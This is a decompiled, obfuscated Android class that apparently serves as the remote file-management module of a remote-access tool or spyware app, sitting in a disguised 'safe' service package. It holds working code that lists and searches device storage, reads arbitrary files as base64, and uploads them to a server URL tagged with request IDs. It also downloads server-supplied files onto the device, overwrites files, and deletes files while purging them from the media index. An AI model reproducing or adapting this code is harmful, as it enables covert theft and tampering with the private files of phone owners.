package p000;

import android.media.MediaScannerConnection;
import android.os.Build;
import android.os.Environment;
import android.provider.MediaStore;
import android.util.Base64;
import android.webkit.MimeTypeMap;
import com.storm.safe.rock.service.dqtvuisjd;
import io.socket.engineio.client.transports.PollingXHR;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.Locale;
import kotlin.text.AbstractC0779a1;
import okio.Segment;
import org.json.HTTP;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: yx */
/* loaded from: classes2.dex */
public final class C1496yx {

    /* renamed from: a2 */
    public static final /* synthetic */ int f61402a2 = 0;

    /* renamed from: a0 */
    public final dqtvuisjd f61403a0;

    /* renamed from: a1 */
    public final SimpleDateFormat f61404a1 = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());

    static {
        new C1494yv(null);
    }

    public C1496yx(dqtvuisjd dqtvuisjdVar) {
        this.f61403a0 = dqtvuisjdVar;
    }

    /* renamed from: a0 */
    public static boolean m215311a0(String str, String str2) {
        File file = new File(str);
        File file2 = new File(str2);
        if (!file.exists()) {
            return false;
        }
        try {
            AbstractC1517zh.m215417f5(file, file2);
            return true;
        } catch (Exception e) {
            t60.m214705c6("FileModule", "复制文件失败", e);
            return false;
        }
    }

    /* renamed from: a1 */
    public static JSONObject m215312a1(C1496yx c1496yx, File file) throws JSONException {
        c1496yx.getClass();
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("name", file.getName());
        jSONObject.put("path", file.getAbsolutePath());
        jSONObject.put("isDirectory", file.isDirectory());
        jSONObject.put("isFile", file.isFile());
        jSONObject.put("size", file.isFile() ? file.length() : 0L);
        jSONObject.put("sizeFormatted", m215313a4(file.length()));
        jSONObject.put("lastModified", file.lastModified());
        jSONObject.put("lastModifiedFormatted", c1496yx.f61404a1.format(new Date(file.lastModified())));
        jSONObject.put("isHidden", file.isHidden());
        jSONObject.put("canRead", file.canRead());
        jSONObject.put("canWrite", file.canWrite());
        if (file.isFile()) {
            String name = file.getName();
            t60.m214694b5(name, "name");
            jSONObject.put("extension", AbstractC0779a1.m213683d6(name, ""));
            jSONObject.put("mimeType", m215314a5(file));
        }
        if (file.isDirectory()) {
            try {
                File[] fileArrListFiles = file.listFiles();
                jSONObject.put("childCount", fileArrListFiles != null ? fileArrListFiles.length : 0);
                return jSONObject;
            } catch (Exception unused) {
                jSONObject.put("childCount", 0);
            }
        }
        return jSONObject;
    }

    /* renamed from: a4 */
    public static String m215313a4(long j) {
        if (j <= 0) {
            return "0 B";
        }
        double d = j;
        int iLog10 = (int) (Math.log10(d) / Math.log10(1024.0d));
        return String.format("%.2f %s", Arrays.copyOf(new Object[]{Double.valueOf(d / Math.pow(1024.0d, iLog10)), new String[]{"B", "KB", "MB", "GB", "TB"}[iLog10]}, 2));
    }

    /* renamed from: a5 */
    public static String m215314a5(File file) {
        String name = file.getName();
        t60.m214694b5(name, "name");
        String lowerCase = AbstractC0779a1.m213683d6(name, "").toLowerCase(Locale.ROOT);
        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        String mimeTypeFromExtension = MimeTypeMap.getSingleton().getMimeTypeFromExtension(lowerCase);
        return mimeTypeFromExtension == null ? "application/octet-stream" : mimeTypeFromExtension;
    }

    /* renamed from: a6 */
    public static JSONObject m215315a6() {
        JSONObject jSONObject = new JSONObject();
        try {
            File externalStorageDirectory = Environment.getExternalStorageDirectory();
            long totalSpace = externalStorageDirectory.getTotalSpace();
            long freeSpace = externalStorageDirectory.getFreeSpace();
            long j = totalSpace - freeSpace;
            jSONObject.put("total", totalSpace);
            jSONObject.put("totalFormatted", m215313a4(totalSpace));
            jSONObject.put("free", freeSpace);
            jSONObject.put("freeFormatted", m215313a4(freeSpace));
            jSONObject.put("used", j);
            jSONObject.put("usedFormatted", m215313a4(j));
            jSONObject.put("usedPercent", totalSpace > 0 ? (j * 100) / totalSpace : 0L);
            return jSONObject;
        } catch (Exception e) {
            t60.m214705c6("FileModule", "获取存储信息失败", e);
            return jSONObject;
        }
    }

    /* renamed from: a9 */
    public static JSONObject m215316a9(String str) throws JSONException {
        JSONObject jSONObject = new JSONObject();
        File file = new File(str);
        if (!file.exists()) {
            jSONObject.put("error", "文件不存在");
            return jSONObject;
        }
        if (file.length() > 52428800) {
            jSONObject.put("error", "文件过大，最大支持 ".concat(m215313a4(52428800L)));
            return jSONObject;
        }
        try {
            String strEncodeToString = Base64.encodeToString(AbstractC1517zh.m215419f7(file), 2);
            jSONObject.put("path", str);
            jSONObject.put("data", strEncodeToString);
            jSONObject.put("size", file.length());
            jSONObject.put("mimeType", m215314a5(file));
            jSONObject.put("name", file.getName());
            return jSONObject;
        } catch (Exception e) {
            t60.m214705c6("FileModule", "读取文件失败", e);
            jSONObject.put("error", e.getMessage());
            return jSONObject;
        }
    }

    /* renamed from: b2 */
    public static void m215317b2(String str, String str2, String str3) throws IOException {
        t60.m214695b6(str, "uploadUrl");
        try {
            URLConnection uRLConnectionOpenConnection = new URL(str).openConnection();
            t60.m214693b4(uRLConnectionOpenConnection, "null cannot be cast to non-null type java.net.HttpURLConnection");
            HttpURLConnection httpURLConnection = (HttpURLConnection) uRLConnectionOpenConnection;
            String str4 = "----WebKitFormBoundary" + System.currentTimeMillis();
            httpURLConnection.setRequestMethod("POST");
            httpURLConnection.setDoOutput(true);
            httpURLConnection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + str4);
            DataOutputStream dataOutputStream = new DataOutputStream(httpURLConnection.getOutputStream());
            dataOutputStream.writeBytes("--" + str4 + HTTP.CRLF);
            dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"requestId\"\r\n\r\n");
            dataOutputStream.writeBytes(str2.concat(HTTP.CRLF));
            dataOutputStream.writeBytes("--" + str4 + HTTP.CRLF);
            dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"error\"\r\n\r\n");
            dataOutputStream.writeBytes(str3.concat(HTTP.CRLF));
            dataOutputStream.writeBytes("--" + str4 + "--\r\n");
            dataOutputStream.flush();
            dataOutputStream.close();
            httpURLConnection.getResponseCode();
            httpURLConnection.disconnect();
        } catch (Exception e) {
            t60.m214705c6("FileModule", "发送错误失败", e);
        }
    }

    /* renamed from: b3 */
    public static JSONObject m215318b3(String str, String str2, String str3) throws JSONException, IOException {
        String strM210590e1;
        BufferedReader bufferedReader;
        t60.m214695b6(str2, "uploadUrl");
        JSONObject jSONObject = new JSONObject();
        File file = new File(str);
        if (!file.exists()) {
            jSONObject.put("error", "文件不存在");
            return jSONObject;
        }
        long length = file.length();
        if (length > 52428800) {
            jSONObject.put("error", "文件过大，最大支持 ".concat(m215313a4(52428800L)));
            return jSONObject;
        }
        try {
            URLConnection uRLConnectionOpenConnection = new URL(str2 + "?requestId=" + str3 + "&fileName=" + URLEncoder.encode(file.getName(), "UTF-8") + "&path=" + URLEncoder.encode(str, "UTF-8") + "&mimeType=" + URLEncoder.encode(m215314a5(file), "UTF-8")).openConnection();
            t60.m214693b4(uRLConnectionOpenConnection, "null cannot be cast to non-null type java.net.HttpURLConnection");
            HttpURLConnection httpURLConnection = (HttpURLConnection) uRLConnectionOpenConnection;
            httpURLConnection.setRequestMethod("POST");
            httpURLConnection.setDoOutput(true);
            httpURLConnection.setDoInput(true);
            httpURLConnection.setUseCaches(false);
            httpURLConnection.setRequestProperty("Content-Type", "application/octet-stream");
            httpURLConnection.setRequestProperty("Content-Length", String.valueOf(length));
            httpURLConnection.setFixedLengthStreamingMode(length);
            httpURLConnection.setConnectTimeout(120000);
            httpURLConnection.setReadTimeout(600000);
            FileInputStream fileInputStream = new FileInputStream(file);
            try {
                OutputStream outputStream = httpURLConnection.getOutputStream();
                t60.m214694b5(outputStream, "connection.outputStream");
                BufferedOutputStream bufferedOutputStream = outputStream instanceof BufferedOutputStream ? (BufferedOutputStream) outputStream : new BufferedOutputStream(outputStream, Segment.SIZE);
                try {
                    byte[] bArr = new byte[65536];
                    while (true) {
                        int i = fileInputStream.read(bArr);
                        if (i == -1) {
                            break;
                        }
                        bufferedOutputStream.write(bArr, 0, i);
                    }
                    bufferedOutputStream.flush();
                    bufferedOutputStream.close();
                    fileInputStream.close();
                    int responseCode = httpURLConnection.getResponseCode();
                    if (responseCode == 200) {
                        InputStream inputStream = httpURLConnection.getInputStream();
                        t60.m214694b5(inputStream, "connection.inputStream");
                        bufferedReader = new BufferedReader(new InputStreamReader(inputStream, AbstractC0577hd.f56650a0), Segment.SIZE);
                        try {
                            strM210590e1 = b81.m210590e1(bufferedReader);
                            bufferedReader.close();
                        } finally {
                        }
                    } else {
                        InputStream errorStream = httpURLConnection.getErrorStream();
                        if (errorStream != null) {
                            bufferedReader = new BufferedReader(new InputStreamReader(errorStream, AbstractC0577hd.f56650a0), Segment.SIZE);
                            try {
                                strM210590e1 = b81.m210590e1(bufferedReader);
                                bufferedReader.close();
                            } finally {
                                try {
                                    throw th;
                                } finally {
                                }
                            }
                        } else {
                            strM210590e1 = "未知错误";
                        }
                    }
                    if (responseCode == 200) {
                        jSONObject.put(PollingXHR.Request.EVENT_SUCCESS, true);
                    } else {
                        jSONObject.put("error", "上传失败: " + responseCode + " - " + strM210590e1);
                    }
                    httpURLConnection.disconnect();
                    return jSONObject;
                } finally {
                }
            } catch (Throwable th) {
                try {
                    throw th;
                } catch (Throwable th2) {
                    kj1.m213559a6(fileInputStream, th);
                    throw th2;
                }
            }
        } catch (Exception e) {
            t60.m214705c6("FileModule", "❌ HTTP 上传失败: ".concat(e.getClass().getSimpleName()), e);
            jSONObject.put("error", e.getClass().getSimpleName() + ": " + e.getMessage());
            return jSONObject;
        }
    }

    /* renamed from: a2 */
    public final boolean m215319a2(String str) {
        dqtvuisjd dqtvuisjdVar = this.f61403a0;
        File file = new File(str);
        if (!file.exists()) {
            t60.m214726f4("FileModule", "⚠️ 文件不存在: ".concat(str));
            return false;
        }
        try {
            boolean zM215418f6 = file.isDirectory() ? AbstractC1517zh.m215418f6(file) : file.delete();
            if (zM215418f6) {
                try {
                    MediaScannerConnection.scanFile(dqtvuisjdVar, new String[]{str}, null, null);
                    try {
                        dqtvuisjdVar.getContentResolver().delete(MediaStore.Files.getContentUri("external"), "_data=?", new String[]{str});
                    } catch (Exception e) {
                        t60.m214726f4("FileModule", "⚠️ 从MediaStore删除失败: " + e.getMessage());
                    }
                } catch (Exception e2) {
                    t60.m214726f4("FileModule", "⚠️ 媒体扫描失败: " + e2.getMessage());
                }
            } else {
                t60.m214704c5("FileModule", "❌ 删除文件失败: ".concat(str));
            }
            return zM215418f6;
        } catch (Exception e3) {
            t60.m214705c6("FileModule", "删除文件失败", e3);
            return false;
        }
    }

    /* renamed from: a3 */
    public final JSONObject m215320a3(String str, String str2) throws JSONException, IOException {
        HttpURLConnection httpURLConnection;
        t60.m214695b6(str, "downloadUrl");
        JSONObject jSONObject = new JSONObject();
        if (!m215321a7()) {
            jSONObject.put("error", "没有存储权限");
            return jSONObject;
        }
        try {
            URLConnection uRLConnectionOpenConnection = new URL(str).openConnection();
            t60.m214693b4(uRLConnectionOpenConnection, "null cannot be cast to non-null type java.net.HttpURLConnection");
            httpURLConnection = (HttpURLConnection) uRLConnectionOpenConnection;
            httpURLConnection.setRequestMethod("GET");
            httpURLConnection.setConnectTimeout(60000);
            httpURLConnection.setReadTimeout(300000);
            httpURLConnection.connect();
        } catch (Exception e) {
            t60.m214705c6("FileModule", "❌ 从服务器下载文件失败", e);
            String message = e.getMessage();
            if (message == null) {
                message = "下载失败";
            }
            jSONObject.put("error", message);
        }
        if (httpURLConnection.getResponseCode() != 200) {
            jSONObject.put("error", "服务器返回错误: " + httpURLConnection.getResponseCode());
            return jSONObject;
        }
        File file = new File(str2);
        File parentFile = file.getParentFile();
        if (parentFile != null) {
            parentFile.mkdirs();
        }
        InputStream inputStream = httpURLConnection.getInputStream();
        try {
            FileOutputStream fileOutputStream = new FileOutputStream(file);
            try {
                byte[] bArr = new byte[Segment.SIZE];
                long j = 0;
                while (true) {
                    int i = inputStream.read(bArr);
                    if (i == -1) {
                        break;
                    }
                    fileOutputStream.write(bArr, 0, i);
                    j += i;
                }
                fileOutputStream.close();
                inputStream.close();
                httpURLConnection.disconnect();
                try {
                    MediaScannerConnection.scanFile(this.f61403a0, new String[]{file.getAbsolutePath()}, null, new C1493yu());
                } catch (Exception e2) {
                    t60.m214726f4("FileModule", "⚠️ 媒体扫描失败: " + e2.getMessage());
                }
                jSONObject.put(PollingXHR.Request.EVENT_SUCCESS, true);
                jSONObject.put("path", str2);
                jSONObject.put("size", j);
                jSONObject.put("sizeFormatted", m215313a4(j));
                return jSONObject;
            } finally {
            }
        } finally {
        }
    }

    /* renamed from: a7 */
    public final boolean m215321a7() {
        return Build.VERSION.SDK_INT >= 30 ? Environment.isExternalStorageManager() : AbstractC1117qo.m214411a7(this.f61403a0, "android.permission.READ_EXTERNAL_STORAGE") == 0;
    }

    /* JADX WARN: Removed duplicated region for block: B:26:0x0084 A[Catch: Exception -> 0x0063, TryCatch #0 {Exception -> 0x0063, blocks: (B:14:0x0052, B:16:0x0058, B:20:0x0065, B:22:0x006f, B:24:0x0073, B:27:0x0087, B:26:0x0084, B:28:0x008a, B:29:0x009e, B:31:0x00a4, B:32:0x00b7, B:35:0x00d2), top: B:39:0x0052 }] */
    /* renamed from: a8 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final JSONObject m215322a8(String str, boolean z) throws JSONException {
        JSONObject jSONObject = new JSONObject();
        JSONArray jSONArray = new JSONArray();
        if (!m215321a7()) {
            t60.m214704c5("FileModule", "❌ 没有存储权限");
            jSONObject.put("error", "没有存储权限");
            return jSONObject;
        }
        File file = new File(str);
        if (!file.exists()) {
            t60.m214704c5("FileModule", "❌ 路径不存在: ".concat(str));
            jSONObject.put("error", "路径不存在");
            return jSONObject;
        }
        if (!file.isDirectory()) {
            t60.m214704c5("FileModule", "❌ 不是目录: ".concat(str));
            jSONObject.put("error", "不是目录");
            return jSONObject;
        }
        try {
            File[] fileArrListFiles = file.listFiles();
            if (fileArrListFiles == null) {
                t60.m214704c5("FileModule", "❌ listFiles 返回 null，可能是权限问题或目录不可读");
                jSONObject.put("error", "无法读取目录内容，请检查权限");
                return jSONObject;
            }
            ArrayList arrayList = new ArrayList();
            for (File file2 : fileArrListFiles) {
                if (!z) {
                    String name = file2.getName();
                    t60.m214694b5(name, "it.name");
                    if (!AbstractC0779a1.m213679d2(name, false, ".")) {
                        arrayList.add(file2);
                    }
                }
            }
            for (File file3 : AbstractC0715je.m213300i7(arrayList, new C1495yw(0, new C1214s9(6)))) {
                t60.m214694b5(file3, "file");
                jSONArray.put(m215312a1(this, file3));
            }
            jSONObject.put("path", str);
            jSONObject.put("files", jSONArray);
            jSONObject.put("count", jSONArray.length());
            String parent = file.getParent();
            if (parent == null) {
                parent = "/";
            }
            jSONObject.put("parentPath", parent);
            return jSONObject;
        } catch (Exception e) {
            t60.m214705c6("FileModule", "❌ 获取文件列表失败", e);
            jSONObject.put("error", e.getMessage());
            return jSONObject;
        }
    }

    /* renamed from: b0 */
    public final JSONObject m215323b0(String str, String str2) throws JSONException {
        JSONObject jSONObject = new JSONObject();
        if (!m215321a7()) {
            jSONObject.put("error", "没有存储权限");
            return jSONObject;
        }
        try {
            File file = new File(str);
            File parentFile = file.getParentFile();
            if (parentFile != null) {
                parentFile.mkdirs();
            }
            byte[] bArrDecode = Base64.decode(str2, 0);
            t60.m214694b5(bArrDecode, "bytes");
            AbstractC1517zh.m215421f9(file, bArrDecode);
            try {
                MediaScannerConnection.scanFile(this.f61403a0, new String[]{file.getAbsolutePath()}, null, new C1493yu());
            } catch (Exception e) {
                t60.m214726f4("FileModule", "⚠️ 媒体扫描失败: " + e.getMessage());
            }
            jSONObject.put(PollingXHR.Request.EVENT_SUCCESS, true);
            jSONObject.put("path", str);
            jSONObject.put("size", bArrDecode.length);
            jSONObject.put("sizeFormatted", m215313a4(bArrDecode.length));
        } catch (Exception e2) {
            t60.m214705c6("FileModule", "❌ 保存文件失败", e2);
            String message = e2.getMessage();
            if (message == null) {
                message = "保存失败";
            }
            jSONObject.put("error", message);
        }
        return jSONObject;
    }

    /* renamed from: b1 */
    public final void m215324b1(File file, String str, JSONArray jSONArray) {
        if (jSONArray.length() >= 100) {
            return;
        }
        try {
            File[] fileArrListFiles = file.listFiles();
            if (fileArrListFiles != null) {
                for (File file2 : fileArrListFiles) {
                    if (jSONArray.length() >= 100) {
                        return;
                    }
                    String name = file2.getName();
                    t60.m214694b5(name, "file.name");
                    String lowerCase = name.toLowerCase(Locale.ROOT);
                    t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                    if (AbstractC0779a1.m213652a5(lowerCase, str, false)) {
                        jSONArray.put(m215312a1(this, file2));
                    }
                    if (file2.isDirectory()) {
                        String name2 = file2.getName();
                        t60.m214694b5(name2, "file.name");
                        if (!AbstractC0779a1.m213679d2(name2, false, ".")) {
                            m215324b1(file2, str, jSONArray);
                        }
                    }
                }
            }
        } catch (Exception unused) {
        }
    }
}
